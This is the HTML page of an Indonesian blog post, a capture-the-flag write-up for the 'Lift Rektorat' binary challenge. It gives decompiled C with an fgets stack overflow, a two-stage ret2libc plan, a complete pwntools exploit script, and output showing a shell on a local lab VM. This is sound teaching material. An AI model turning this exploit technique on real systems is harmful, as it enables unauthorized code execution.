@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Lift Rektorat (300 pts) Kamu sedang berada direktorat karena kamu hendak menemui rektor karena kamu ditunjuk menjadi kepala keamanan cyber di IPB. Tiba-tiba terjadi sebuah insiden yang membuat kamu t">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AgriHack 0x2 - Lift Rektorat Writeup">
+<meta property="og:url" content="https://zeroload.github.io/2017/11/24/agrihack-0x2-lift-rektorat-writeup/index.html">
+<meta property="og:site_name" content="Catousify">
+<meta property="og:description" content="Lift Rektorat (300 pts) Kamu sedang berada direktorat karena kamu hendak menemui rektor karena kamu ditunjuk menjadi kepala keamanan cyber di IPB. Tiba-tiba terjadi sebuah insiden yang membuat kamu t">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2018-10-16T17:54:22.645Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="AgriHack 0x2 - Lift Rektorat Writeup">
+<meta name="twitter:description" content="Lift Rektorat (300 pts) Kamu sedang berada direktorat karena kamu hendak menemui rektor karena kamu ditunjuk menjadi kepala keamanan cyber di IPB. Tiba-tiba terjadi sebuah insiden yang membuat kamu t">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/img/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/img/favicon-96x96.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/img/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>AgriHack 0x2 - Lift Rektorat Writeup</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Catousify" type="application/atom+xml" />
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2017/11/27/tuctf-2017-reverse-engineering-writeup/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2017/11/23/bypassing-kakao-login-signature-check-for-tampered-android-application/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://zeroload.github.io/2017/11/24/agrihack-0x2-lift-rektorat-writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://zeroload.github.io/2017/11/24/agrihack-0x2-lift-rektorat-writeup/&text=AgriHack 0x2 - Lift Rektorat Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://zeroload.github.io/2017/11/24/agrihack-0x2-lift-rektorat-writeup/&title=AgriHack 0x2 - Lift Rektorat Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zeroload.github.io/2017/11/24/agrihack-0x2-lift-rektorat-writeup/&is_video=false&description=AgriHack 0x2 - Lift Rektorat Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=AgriHack 0x2 - Lift Rektorat Writeup&body=Check out this article: https://zeroload.github.io/2017/11/24/agrihack-0x2-lift-rektorat-writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://zeroload.github.io/2017/11/24/agrihack-0x2-lift-rektorat-writeup/&title=AgriHack 0x2 - Lift Rektorat Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://zeroload.github.io/2017/11/24/agrihack-0x2-lift-rektorat-writeup/&title=AgriHack 0x2 - Lift Rektorat Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://zeroload.github.io/2017/11/24/agrihack-0x2-lift-rektorat-writeup/&title=AgriHack 0x2 - Lift Rektorat Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://zeroload.github.io/2017/11/24/agrihack-0x2-lift-rektorat-writeup/&title=AgriHack 0x2 - Lift Rektorat Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://zeroload.github.io/2017/11/24/agrihack-0x2-lift-rektorat-writeup/&name=AgriHack 0x2 - Lift Rektorat Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        AgriHack 0x2 - Lift Rektorat Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Catousify</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2017-11-23T17:38:01.000Z" itemprop="datePublished">2017-11-24</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p><em><strong>Lift Rektorat (300 pts)</strong></em> Kamu sedang berada direktorat karena kamu hendak menemui rektor karena kamu ditunjuk menjadi kepala keamanan cyber di IPB. Tiba-tiba terjadi sebuah insiden yang membuat kamu tersadar, bahwa bahkan lift rektorat memiliki celah untuk dieksploitasi. Tunjukkan bagaimana kamu mengeksploitasi celah tersebut. – binary –</p>
+</blockquote>
+<p><em><strong>Solusi:</strong></em> Diberikan binary ELF 32-bit dengan NX bit enabled dan tanpa stack canary. Dapat di-_ramal-_kan sekiranya soal ini di_solve_ dengan return to libc karena stack sendiri tidak dapat dieksekusi.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">danger</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Eh] [ebp-4Ah]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(aSelamatDatangD, <span class="string">"|            Peringatan Bahaya Lift Berhenti Berfungsi                |"</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(aSilahkanMasuka, <span class="string">"|              Silahkan Kirimkan Pesan Kepada Petugas                 |"</span>);</span><br><span class="line">  cetak(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|--------------------||-------------||------------||------------------|"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|____________________||-------------||------------||__________________|"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Pesan : "</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">200</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(aSelamatDatangD, <span class="string">"|                        Pesan Terkirim                               |"</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(aSilahkanMasuka, <span class="string">"|            Silahkan Menunggu Sejenak dan Tetap Tenang               |"</span>);</span><br><span class="line">  cetak(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|--------------------||-------------||------------||------------------|"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|____________________||-------------||------------||__________________|"</span>);</span><br><span class="line">  <span class="keyword">return</span> sleep(<span class="number">5u</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> \*\*argv, <span class="keyword">const</span> <span class="keyword">char</span> \*\*envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ST0C_4</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp-4h] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+0h] [ebp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [esp+7h] [ebp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+8h] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v10; <span class="comment">// [esp+14h] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  v10 = &amp;argc;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  cetak(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !__isoc99_scanf(<span class="string">"%d"</span>, &amp;v7, v3, v4, v6, v7) || v7 &gt; <span class="number">12</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(aSelamatDatangD, <span class="string">"|                          Mohon Maaf                                 |"</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(aSilahkanMasuka, <span class="string">"|                 Lantai yang Anda Masukan Salah                      |"</span>);</span><br><span class="line">    cetak(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"|--------------------||-------------||------------||------------------|"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"|____________________||-------------||------------||__________________|"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    v8 = getchar();</span><br><span class="line">  <span class="keyword">while</span> ( v8 != <span class="number">10</span> &amp;&amp; v8 != <span class="number">-1</span> );</span><br><span class="line">  <span class="built_in">strcpy</span>(aSelamatDatangD, <span class="string">"|                     Bogor Agricultural University                   |"</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(aSilahkanMasuka, <span class="string">"|                     Searching and Serving The Best                  |"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= v7; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sleep(<span class="number">2u</span>);</span><br><span class="line">    byte_804B0C4[<span class="number">5</span> * i - <span class="number">2</span>] = <span class="string">' '</span>;</span><br><span class="line">    byte_804B0C4[<span class="number">5</span> * i + <span class="number">2</span>] = <span class="string">' '</span>;</span><br><span class="line">    byte_804B0C4[<span class="number">5</span> * (i + <span class="number">1</span>) + <span class="number">2</span>] = <span class="string">'|'</span>;</span><br><span class="line">    byte_804B0C4[<span class="number">5</span> * (i + <span class="number">1</span>) - <span class="number">2</span>] = <span class="string">'|'</span>;</span><br><span class="line">    cetak(i);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"|--------------------||-------------||------------||------------------|"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"|                    ||             ||            ||                  |"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"|____________________||-------------||------------||__________________|"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">7</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      danger();</span><br><span class="line">      <span class="built_in">strcpy</span>(aSelamatDatangD, <span class="string">"|                     Bogor Agricultural University                   |"</span>);</span><br><span class="line">      <span class="built_in">strcpy</span>(aSilahkanMasuka, <span class="string">"|                     Searching and Serving The Best                  |"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  cetak(i - <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|--------------------||                           ||------------------|"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|                    ||                           ||                  |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|                    ||                           ||                  |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|                    ||                           ||                  |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|                    ||                           ||                  |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|                    ||                           ||                  |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|                    ||                           ||                  |"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"|____________________||                           ||__________________|"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Terlihat kalau dalau dari source code, fungsi <code>danger</code> ada bug klasik stack buffer overflow pada fungsi fgets, yang me-overflow- <code>char s</code>. <code>danger</code> sendiri dipanggil saat iterasi i ke-7, user juga dapat mengontrol sampai berapa iterasi dilaksanakan. Lanjut ke permasalahan kedua, saved EIP bisa dikontrol dengan stack buffer overflow, tapi mau return kemana? return2libc perlu leaked libc address. Nah, teringat kalau binary ini adalah 32-bit jadi gaperlu repot-repot setup ROP yang terlihat magis, tinggal push GOT puts ke stack, trus print dengan menggunakan PLT puts <em>lagi</em>. Agar exploit berlanjut terus jangan lupa untuk return ke fungsi <code>danger</code> lagi untuk lanjut ke Stage ke-2 yakni return ke system dan exec /bin/sh. system address bisa dikalkulasi dengan bantuan libcdb. Dengan demikian strategi yang bisa ditulis pada code,</p>
+<ol>
+<li>Leak libc address, dengan push alamat suatu GOT lalu memanggil puts dan kembali ke danger</li>
+<li>Kalkulasi system dan /bin/sh dari libc address</li>
+<li>Input buffer == junk[78] + system + char junk[4] +  binsh</li>
+<li>profit</li>
+</ol>
+<p>Berikut codenya,</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process([<span class="string">'./lift_rektorat'</span>])</span><br><span class="line">lift = ELF(<span class="string">'./lift_rektorat'</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'--------- STAGE 1 ---------'</span>)</span><br><span class="line"></span><br><span class="line">buf = <span class="string">"A"</span> * <span class="number">78</span> <span class="comment">#junk</span></span><br><span class="line">buf += p32(lift.plt[<span class="string">'puts'</span>]) <span class="comment"># call puts</span></span><br><span class="line">buf += p32(lift.symbols[<span class="string">'danger'</span>]) <span class="comment"># return back to danger</span></span><br><span class="line">buf += p32(lift.got[<span class="string">'puts'</span>]) <span class="comment"># GOT</span></span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">"7"</span>) <span class="comment"># control the iteration</span></span><br><span class="line">r.sendline(buf)</span><br><span class="line">r.recvuntil(<span class="string">'Pesan Terkirim'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'|____________________||-------------||------------||__________________|'</span>)</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'--------- STAGE 2 ---------'</span>)</span><br><span class="line"></span><br><span class="line">libc_puts = int(u32(r.recvn(<span class="number">4</span>))) <span class="comment"># leaked libc address</span></span><br><span class="line"><span class="comment"># local libc, saelo's vm ctfbox, Ubuntu 14.04.5 LTS, vagrant</span></span><br><span class="line">puts_offset = <span class="number">0x00064da0</span></span><br><span class="line">system_offset = <span class="number">0x0003fe70</span></span><br><span class="line">str_bin_sh_offset = <span class="number">0x0015ff0c</span></span><br><span class="line"></span><br><span class="line">libc_base = libc_puts - puts_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">libc_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line"></span><br><span class="line">buf = <span class="string">"A"</span> * <span class="number">78</span> <span class="comment"># junk</span></span><br><span class="line">buf += p32(libc_system)</span><br><span class="line">buf += <span class="string">"DEAD"</span> <span class="comment"># junk</span></span><br><span class="line">buf += p32(libc_bin_sh)</span><br><span class="line"></span><br><span class="line">r.sendline(buf)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p><em><strong>$profit</strong></em></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[+] Starting local process &apos;./lift_rektorat&apos;: pid 5802</span><br><span class="line">[*] &apos;/home/vagrant/ctf/agrihack0x2/lift_rektorat&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] --------- STAGE 1 ---------</span><br><span class="line">[*] --------- STAGE 2 ---------</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">\x86\x84\x0�    ]��a��`�</span><br><span class="line">[..redacted..]</span><br><span class="line">$ id</span><br><span class="line">uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)</span><br><span class="line">$ whoami</span><br><span class="line">vagrant</span><br></pre></td></tr></table></figure>
+<p><em><strong>Solved!</strong></em></p>
+<hr>
+<p>Sedikit cerita dibalik penemuan flag pada soal kali ini, sebelum saya mengerjakan soal ini sendiri, saya belum paham apa itu ROP dan berbagai macam permasalahan pada soal disini. <strong>Lesson learned:</strong> 32-bit calling convention, ret2libc, simple ROP.</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://zeroload.github.io/2017/11/24/agrihack-0x2-lift-rektorat-writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://zeroload.github.io/2017/11/24/agrihack-0x2-lift-rektorat-writeup/&text=AgriHack 0x2 - Lift Rektorat Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://zeroload.github.io/2017/11/24/agrihack-0x2-lift-rektorat-writeup/&title=AgriHack 0x2 - Lift Rektorat Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zeroload.github.io/2017/11/24/agrihack-0x2-lift-rektorat-writeup/&is_video=false&description=AgriHack 0x2 - Lift Rektorat Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=AgriHack 0x2 - Lift Rektorat Writeup&body=Check out this article: https://zeroload.github.io/2017/11/24/agrihack-0x2-lift-rektorat-writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://zeroload.github.io/2017/11/24/agrihack-0x2-lift-rektorat-writeup/&title=AgriHack 0x2 - Lift Rektorat Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://zeroload.github.io/2017/11/24/agrihack-0x2-lift-rektorat-writeup/&title=AgriHack 0x2 - Lift Rektorat Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://zeroload.github.io/2017/11/24/agrihack-0x2-lift-rektorat-writeup/&title=AgriHack 0x2 - Lift Rektorat Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://zeroload.github.io/2017/11/24/agrihack-0x2-lift-rektorat-writeup/&title=AgriHack 0x2 - Lift Rektorat Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://zeroload.github.io/2017/11/24/agrihack-0x2-lift-rektorat-writeup/&name=AgriHack 0x2 - Lift Rektorat Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 zeroload
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'zeroload-github-io';
+
+        (function(){
